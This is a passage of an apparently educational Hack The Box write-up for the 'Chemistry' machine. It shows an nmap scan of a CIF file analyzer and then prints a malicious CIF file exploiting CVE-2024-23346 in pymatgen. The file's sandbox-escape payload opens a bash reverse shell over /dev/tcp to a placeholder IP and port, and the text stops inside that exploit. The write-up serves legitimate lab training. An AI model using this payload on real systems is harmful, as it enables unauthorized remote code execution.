<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Chemistry</title>
<meta name=description content="Platform: Hack The Box Link: Chemistry Level: Easy OS: Linux Chemistry starts with a file analyzer processing CIF files. Exploiting CVE-2024-23346, we gain an …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/posts/htb-chemistry/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Chemistry"><meta property="og:description" content="Platform: Hack The Box Link: Chemistry Level: Easy OS: Linux Chemistry starts with a file analyzer processing CIF files. Exploiting CVE-2024-23346, we gain an …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Chemistry/Chemistry.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Chemistry/Chemistry.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Chemistry"><meta name=twitter:description content="Platform: Hack The Box Link: Chemistry Level: Easy OS: Linux Chemistry starts with a file analyzer processing CIF files. Exploiting CVE-2024-23346, we gain an …"><meta property="twitter:domain" content="https://scorpiosec.com/posts/htb-chemistry/"><meta property="twitter:url" content="https://scorpiosec.com/posts/htb-chemistry/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Chemistry/Chemistry.png"><link rel=canonical href=https://scorpiosec.com/posts/htb-chemistry/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/posts/ aria-label><span data-feather=book></span> Posts</a></div><div class=nav-link><a href=https://scorpiosec.com/projects/ aria-label><span data-feather=code></span> Projects</a></div><div class=nav-link><a href=https://scorpiosec.com/tags/ aria-label><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/categories/ aria-label><span data-feather=folder></span> Categories</a></div><div class="nav-link language-switcher"><a href=/fr/posts/htb-chemistry/>Français</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/posts/><span data-feather=book></span> Posts</a></li><li class=nav-item><a href=https://scorpiosec.com/projects/><span data-feather=code></span> Projects</a></li><li class=nav-item><a href=https://scorpiosec.com/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/categories/><span data-feather=folder></span> Categories</a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Chemistry</h1><small role=doc-subtitle></small><p class=post-date>4 min read |
<span class=post-date>March 7, 2025</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platform: Hack The Box</li><li>Link: <a href=https://app.hackthebox.com/machines/Chemistry>Chemistry</a></li><li>Level: Easy</li><li>OS: Linux</li></ul><hr><p>Chemistry starts with a file analyzer processing CIF files. Exploiting <code>CVE-2024-23346</code>, we gain an initial foothold by uploading a malicious CIF file. On the target, we discover a database file containing a password hash, enabling us to pivot to another user. Further enumeration reveals an internal website, which we access via tunneling. The website is vulnerable to <code>CVE-2024-23334</code>, allowing us to retrieve the root SSH key and complete the exploitation.</p><h2 id=scanning>Scanning</h2><pre tabindex=0><code>nmap -sC -sV -oA nmap/Chemistry {TARGET_IP}
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2025-01-23 12:47 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.38
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.059s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#d19a66>998</span> closed tcp ports <span style=color:#56b6c2>(</span>conn-refused<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style=color:#56b6c2>(</span>Ubuntu Linux; protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>3072</span> b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc <span style=color:#56b6c2>(</span>RSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#d19a66>256</span> f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b <span style=color:#56b6c2>(</span>ECDSA<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#d19a66>256</span> 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 <span style=color:#56b6c2>(</span>ED25519<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>5000/tcp open  upnp?
</span></span><span style=display:flex><span>| fingerprint-strings: 
</span></span><span style=display:flex><span>|   GetRequest: 
</span></span><span style=display:flex><span>|     HTTP/1.1 <span style=color:#d19a66>200</span> OK
</span></span><span style=display:flex><span>|     Server: Werkzeug/3.0.3 Python/3.9.5
</span></span><span style=display:flex><span>|     Date: Thu, <span style=color:#d19a66>23</span> Jan <span style=color:#d19a66>2025</span> 18:48:53 GMT
</span></span><span style=display:flex><span>|     Content-Type: text/html; <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>utf-8
</span></span><span style=display:flex><span>|     Content-Length: <span style=color:#d19a66>719</span>
</span></span><span style=display:flex><span>|     Vary: Cookie
</span></span><span style=display:flex><span>|     Connection: close
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE html&gt;
</span></span><span style=display:flex><span>|     &lt;html <span style=color:#e06c75>lang</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;meta <span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;meta <span style=color:#e06c75>name</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;viewport&#34;</span> <span style=color:#e06c75>content</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Chemistry - Home&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;link <span style=color:#e06c75>rel</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;stylesheet&#34;</span> <span style=color:#e06c75>href</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/static/styles.css&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;/head&gt;
</span></span><span style=display:flex><span>|     &lt;body&gt;
</span></span><span style=display:flex><span>|     &lt;div <span style=color:#e06c75>class</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span>|     <span style=color:#e06c75>class</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;title&#34;</span>&gt;Chemistry CIF Analyzer&lt;/h1&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF <span style=color:#56b6c2>(</span>Crystallographic Information File<span style=color:#56b6c2>)</span> and analyze the structural data contained within.&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;div <span style=color:#e06c75>class</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;buttons&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;center&gt;&lt;a <span style=color:#e06c75>href</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/login&#34;</span> <span style=color:#e06c75>class</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;btn&#34;</span>&gt;Login&lt;/a&gt;
</span></span><span style=display:flex><span>|     <span style=color:#e06c75>href</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;/register&#34;</span> <span style=color:#e06c75>class</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;btn&#34;</span>&gt;Register&lt;/a&gt;&lt;/center&gt;
</span></span><span style=display:flex><span>|     &lt;/div&gt;
</span></span><span style=display:flex><span>|     &lt;/div&gt;
</span></span><span style=display:flex><span>|     &lt;/body&gt;
</span></span><span style=display:flex><span>|   RTSPRequest: 
</span></span><span style=display:flex><span>|     &lt;!DOCTYPE HTML PUBLIC <span style=color:#98c379>&#34;-//W3C//DTD HTML 4.01//EN&#34;</span>
</span></span><span style=display:flex><span>|     <span style=color:#98c379>&#34;http://www.w3.org/TR/html4/strict.dtd&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;html&gt;
</span></span><span style=display:flex><span>|     &lt;head&gt;
</span></span><span style=display:flex><span>|     &lt;meta http-equiv<span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;Content-Type&#34;</span> <span style=color:#e06c75>content</span><span style=color:#56b6c2>=</span><span style=color:#98c379>&#34;text/html;charset=utf-8&#34;</span>&gt;
</span></span><span style=display:flex><span>|     &lt;title&gt;Error response&lt;/title&gt;
</span></span><span style=display:flex><span>|     &lt;/head&gt;
</span></span><span style=display:flex><span>|     &lt;body&gt;
</span></span><span style=display:flex><span>|     &lt;h1&gt;Error response&lt;/h1&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Error code: 400&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Message: Bad request version <span style=color:#56b6c2>(</span><span style=color:#98c379>&#39;RTSP/1.0&#39;</span><span style=color:#56b6c2>)</span>.&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;
</span></span><span style=display:flex><span>|     &lt;/body&gt;
</span></span><span style=display:flex><span>|_    &lt;/html&gt;
</span></span><span style=display:flex><span><span style=color:#d19a66>1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
</span></span><span style=display:flex><span>SF-Port5000-TCP:V<span style=color:#56b6c2>=</span>7.94SVN%I<span style=color:#56b6c2>=</span>7%D<span style=color:#56b6c2>=</span>1/23%Time<span style=color:#56b6c2>=</span>67928EB5%P<span style=color:#56b6c2>=</span>x86_64-pc-linux-gnu%r
</span></span><span style=display:flex><span>SF:<span style=color:#56b6c2>(</span>GetRequest,38A,<span style=color:#98c379>&#34;HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.0\.3\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x20Python/3\.9\.5\r\nDate:\x20Thu,\x2023\x20Jan\x202025\x2018:48:53\x20
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:x20719\r\nVary:\x20Cookie\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20h
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:tml&gt;\n&lt;html\x20lang=\&#34;en\&#34;&gt;\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\
</span></span></span><span style=display:flex><span><span style=color:#98c379>SF:&#34;</span>UTF-8<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;meta<span style=color:#98c379>\x</span>20name<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>viewport<span style=color:#98c379>\&#34;\x</span>20content<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>widt
</span></span><span style=display:flex><span>SF:h<span style=color:#56b6c2>=</span>device-width,<span style=color:#98c379>\x</span>20initial-scale<span style=color:#56b6c2>=</span>1<span style=color:#98c379>\.</span>0<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;title&gt;Chemis
</span></span><span style=display:flex><span>SF:try<span style=color:#98c379>\x</span>20-<span style=color:#98c379>\x</span>20Home&lt;/title&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;link<span style=color:#98c379>\x</span>20rel<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>stylesheet<span style=color:#98c379>\&#34;\x</span>
</span></span><span style=display:flex><span>SF:20href<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>/static/styles<span style=color:#98c379>\.</span>css<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n</span>&lt;/head&gt;<span style=color:#98c379>\n</span>&lt;body&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\n\x</span><span style=color:#d19a66>2</span>
</span></span><span style=display:flex><span>SF:0<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;div<span style=color:#98c379>\x</span>20class<span style=color:#56b6c2>=</span>
</span></span><span style=display:flex><span>SF:<span style=color:#98c379>\&#34;</span>container<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;h1<span style=color:#98c379>\x</span>20class<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>title<span style=color:#98c379>\&#34;</span>&gt;
</span></span><span style=display:flex><span>SF:Chemistry<span style=color:#98c379>\x</span>20CIF<span style=color:#98c379>\x</span>20Analyzer&lt;/h1&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;p&gt;W
</span></span><span style=display:flex><span>SF:elcome<span style=color:#98c379>\x</span>20to<span style=color:#98c379>\x</span>20the<span style=color:#98c379>\x</span>20Chemistry<span style=color:#98c379>\x</span>20CIF<span style=color:#98c379>\x</span>20Analyzer<span style=color:#98c379>\.\x</span>20This<span style=color:#98c379>\x</span>20tool<span style=color:#98c379>\x</span>
</span></span><span style=display:flex><span>SF:20allows<span style=color:#98c379>\x</span>20you<span style=color:#98c379>\x</span>20to<span style=color:#98c379>\x</span>20upload<span style=color:#98c379>\x</span>20a<span style=color:#98c379>\x</span>20CIF<span style=color:#98c379>\x</span>20<span style=color:#98c379>\(</span>Crystallographic<span style=color:#98c379>\x</span>20In
</span></span><span style=display:flex><span>SF:formation<span style=color:#98c379>\x</span>20File<span style=color:#98c379>\)\x</span>20and<span style=color:#98c379>\x</span>20analyze<span style=color:#98c379>\x</span>20the<span style=color:#98c379>\x</span>20structural<span style=color:#98c379>\x</span>20data<span style=color:#98c379>\x</span>20c
</span></span><span style=display:flex><span>SF:ontained<span style=color:#98c379>\x</span>20within<span style=color:#98c379>\.</span>&lt;/p&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;div<span style=color:#98c379>\x</span>20class
</span></span><span style=display:flex><span>SF:<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>buttons<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;center&gt;
</span></span><span style=display:flex><span>SF:&lt;a<span style=color:#98c379>\x</span>20href<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>/login<span style=color:#98c379>\&#34;\x</span>20class<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>btn<span style=color:#98c379>\&#34;</span>&gt;Login&lt;/a&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\
</span></span></span><span style=display:flex><span><span style=color:#98c379></span>SF:x20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;a<span style=color:#98c379>\x</span>20href<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>/register<span style=color:#98c379>\&#34;\x</span>20class<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>btn<span style=color:#98c379>\&#34;</span>&gt;Re
</span></span><span style=display:flex><span>SF:gister&lt;/a&gt;&lt;/center&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;/div&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>
</span></span><span style=display:flex><span>SF:20<span style=color:#98c379>\x</span>20&lt;/div&gt;<span style=color:#98c379>\n</span>&lt;/body&gt;<span style=color:#98c379>\n</span>&lt;<span style=color:#98c379>&#34;)%r(RTSPRequest,1F4,&#34;</span>&lt;!DOCTYPE<span style=color:#98c379>\x</span>20HTML<span style=color:#98c379>\x</span>20PUBL
</span></span><span style=display:flex><span>SF:IC<span style=color:#98c379>\x</span>20<span style=color:#98c379>\&#34;</span>-//W3C//DTD<span style=color:#98c379>\x</span>20HTML<span style=color:#98c379>\x</span>204<span style=color:#98c379>\.</span>01//EN<span style=color:#98c379>\&#34;\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span><span style=color:#d19a66>2</span>
</span></span><span style=display:flex><span>SF:0<span style=color:#98c379>\x</span>20<span style=color:#98c379>\&#34;</span>http://www<span style=color:#98c379>\.</span>w3<span style=color:#98c379>\.</span>org/TR/html4/strict<span style=color:#98c379>\.</span>dtd<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n</span>&lt;html&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span><span style=color:#d19a66>2</span>
</span></span><span style=display:flex><span>SF:0<span style=color:#98c379>\x</span>20&lt;head&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;meta<span style=color:#98c379>\x</span>20http-equiv<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>Cont
</span></span><span style=display:flex><span>SF:ent-Type<span style=color:#98c379>\&#34;\x</span>20content<span style=color:#56b6c2>=</span><span style=color:#98c379>\&#34;</span>text/html;<span style=color:#e06c75>charset</span><span style=color:#56b6c2>=</span>utf-8<span style=color:#98c379>\&#34;</span>&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span><span style=color:#d19a66>2</span>
</span></span><span style=display:flex><span>SF:0<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;title&gt;Error<span style=color:#98c379>\x</span>20response&lt;/title&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;/head&gt;<span style=color:#98c379>\
</span></span></span><span style=display:flex><span><span style=color:#98c379></span>SF:n<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;body&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;h1&gt;Error<span style=color:#98c379>\x</span>20r
</span></span><span style=display:flex><span>SF:esponse&lt;/h1&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;p&gt;Error<span style=color:#98c379>\x</span>20code:<span style=color:#98c379>\x</span>20400&lt;
</span></span><span style=display:flex><span>SF:/p&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;p&gt;Message:<span style=color:#98c379>\x</span>20Bad<span style=color:#98c379>\x</span>20request<span style=color:#98c379>\x</span>20v
</span></span><span style=display:flex><span>SF:ersion<span style=color:#98c379>\x</span>20<span style=color:#98c379>\(</span><span style=color:#98c379>&#39;RTSP/1\.0&#39;</span><span style=color:#98c379>\)\.</span>&lt;/p&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;p&gt;Err
</span></span><span style=display:flex><span>SF:or<span style=color:#98c379>\x</span>20code<span style=color:#98c379>\x</span>20explanation:<span style=color:#98c379>\x</span>20HTTPStatus<span style=color:#98c379>\.</span>BAD_REQUEST<span style=color:#98c379>\x</span>20-<span style=color:#98c379>\x</span>20Bad<span style=color:#98c379>\x</span>20re
</span></span><span style=display:flex><span>SF:quest<span style=color:#98c379>\x</span>20syntax<span style=color:#98c379>\x</span>20or<span style=color:#98c379>\x</span>20unsupported<span style=color:#98c379>\x</span>20method<span style=color:#98c379>\.</span>&lt;/p&gt;<span style=color:#98c379>\n\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20<span style=color:#98c379>\x</span>20&lt;
</span></span><span style=display:flex><span>SF:/body&gt;<span style=color:#98c379>\n</span>&lt;/html&gt;<span style=color:#98c379>\n</span><span style=color:#98c379>&#34;);
</span></span></span><span style=display:flex><span><span style=color:#98c379>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span style=display:flex><span><span style=color:#98c379>
</span></span></span><span style=display:flex><span><span style=color:#98c379>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span style=display:flex><span><span style=color:#98c379>Nmap done: 1 IP address (1 host up) scanned in 104.38 seconds
</span></span></span></code></pre></div><p>We have two open ports:</p><ul><li>22 - SSH</li><li>5000 - nmap is unable to accurately determine the service</li></ul><h2 id=enumeration>Enumeration</h2><p>At <code>http://10.10.11.38:5000/</code> we find a file analyzer.</p><p><img src=/images/HTB-Chemistry/chemistry_website.png alt="Chemistry website"></p><p>After registering an account we find a Dashboard where we can upload a CIF file, a sample file is also provided.</p><p><img src=/images/HTB-Chemistry/chemistry_dashboard.png alt="Chemistry Dashboard"></p><h2 id=initial-foothold-shell-as-app>Initial Foothold (shell as app)</h2><p>Searching <code>Malicious CIF file</code> on Google we find <a href=https://www.vicarius.io/vsociety/posts/critical-security-flaw-in-pymatgen-library-cve-2024-23346>CVE-2024-23346</a> with a PoC <a href=https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f>here</a>. Below is the content of our malicious CIF file.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#e06c75>data_5yOhtAoR</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>_audit_creation_date</span>            <span style=color:#d19a66>2018</span><span style=color:#56b6c2>-</span><span style=color:#d19a66>06</span><span style=color:#56b6c2>-</span><span style=color:#d19a66>08</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>_audit_creation_method</span>          <span style=color:#98c379>&#34;Pymatgen CIF Parser Arbitrary Code Execution Exploit&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>loop_</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>_parent_propagation_vector</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>id</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>_parent_propagation_vector</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>kxkykz</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>k1</span> [<span style=color:#d19a66>0</span> <span style=color:#d19a66>0</span> <span style=color:#d19a66>0</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>_space_group_magn</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>transform_BNS_Pp_abc</span>  <span style=color:#98c379>&#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&#34;__sub&#34; + &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;/bin/bash -c </span><span style=color:#98c379>\&#39;</span><span style=color:#98c379>sh -i &gt;&amp; /dev/tcp/</span><span style=color:#98c379>{IP}</span><span style=color:#98c379>/</span><span style=color:#98c379>{PORT}</span><span style=color:#98c379> 0&gt;&amp;1</span><span style=color:#98c379>\&#39;</span><span style=color:#98c379>&#34;);0,0,0&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>_space_group_magn</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>number_BNS</span>  <span style=color:#d19a66>62.448</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>_space_group_magn</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>name_BNS</span>  <span style=color:#98c379>&#34;P  n&#39;  m  a&#39;  &#34;</span>
